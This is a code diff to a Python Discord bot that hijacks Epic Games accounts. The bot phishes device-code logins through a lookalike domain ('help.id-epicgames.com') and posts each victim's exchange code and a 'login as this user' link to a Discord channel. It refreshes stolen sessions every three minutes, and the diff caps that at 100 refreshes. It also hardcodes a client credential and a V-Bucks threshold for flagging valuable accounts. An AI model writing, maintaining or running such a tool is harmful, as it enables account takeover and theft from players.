@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-Discord Bot for Epic Games Authentication with true, indefinite session refresh
-using refresh tokens. Corrected for missing 'refresh_expires_in' key.
-- Last Updated: 2025-11-20 10:15:00
+Discord Bot for Epic Games Authentication with a 100-cycle refresh limit (approx. 5 hours)
+and indefinite core token refresh.
+- Last Updated: 2025-11-21 05:15:23
 """
 
 # --- SETUP AND INSTALLATION ---
@@ -44,6 +44,7 @@ NGROK_DOMAIN = "help.id-epicgames.com" # Will fall back to a free URL if this fa
 # --- Epic Games & Timings ---
 EPIC_TOKEN = "OThmN2U0MmMyZTNhNGY4NmE3NGViNDNmYmI0MWVkMzk6MGEyNDQ5YTItMDAxYS00NTFlLWFmZWMtM2U4MTI5MDFjNGQ3"
 REFRESH_INTERVAL = 180  # 3 minutes for refreshing the exchange code
+MAX_REFRESHES = 100     # Limit the session to 100 refreshes (5 hours)
 VBUCKS_THRESHOLD = 5000
 
 # --- Channel Name ---
@@ -311,7 +312,7 @@ def build_user_embed(session, exchange_code, is_initial):
     embed.add_field(name="🔗 Direct Login Link", value=f"**[Click to login as this user]({login_link})**", inline=False)
     embed.add_field(name="Exchange Code", value=f"```{exchange_code}```", inline=False)
 
-    footer_text = f"Session ID: {session['session_id']} | Exchange Code Refreshes: #{session['exchange_refresh_count']} | Core Token Refreshes: #{session['core_token_refresh_count']}"
+    footer_text = f"Session ID: {session['session_id']} | Refresh {session['exchange_refresh_count']}/{MAX_REFRESHES} | Core Refreshes: #{session['core_token_refresh_count']}"
     embed.set_footer(text=footer_text)
     embed.timestamp = datetime.utcnow()
     
@@ -409,15 +410,15 @@ async def monitor_epic_auth(device_code, interval, expires_in, user_ip):
 
 
 async def auto_refresh_session(session_id):
-    """Refreshes tokens and updates the Discord message indefinitely."""
+    """Refreshes tokens and updates the Discord message for 100 cycles (approx. 5 hours)."""
     with session_lock:
         session = active_sessions.get(session_id)
         if not session: return
         display_name = session['account_info'].get('displayName', 'Unknown')
         
-    logger.info(f"[{session_id}] 🔄 INDEFINITE refresh task STARTED for {display_name}.")
+    logger.info(f"[{session_id}] 🔄 5-hour (100 cycle) refresh task STARTED for {display_name}.")
     
-    while True:
+    while session and session.get('exchange_refresh_count', 0) < MAX_REFRESHES:
         await asyncio.sleep(REFRESH_INTERVAL)
         
         with session_lock:
@@ -451,13 +452,13 @@ async def auto_refresh_session(session_id):
                 if session_id in active_sessions:
                     active_sessions[session_id]['exchange_refresh_count'] += 1
             
-            logger.info(f"[{session_id}] ✅ Exchange code refreshed for {display_name} (Refresh #{session['exchange_refresh_count']})")
+            logger.info(f"[{session_id}] ✅ Exchange code refreshed for {display_name} (Refresh #{session['exchange_refresh_count']}/{MAX_REFRESHES})")
             await send_or_update_embed(session_id, new_exchange_code)
         else:
             logger.warning(f"[{session_id}] Exchange code refresh failed for {display_name}. Retrying in {REFRESH_INTERVAL}s.")
 
     with session_lock: active_sessions.pop(session_id, None)
-    logger.info(f"[{session_id}] 🔚 Auto-refresh task ENDED for {display_name}.")
+    logger.info(f"[{session_id}] 🔚 Auto-refresh task ENDED for {display_name} after reaching the 100-cycle limit.")
 
 
 # ==============================================================================
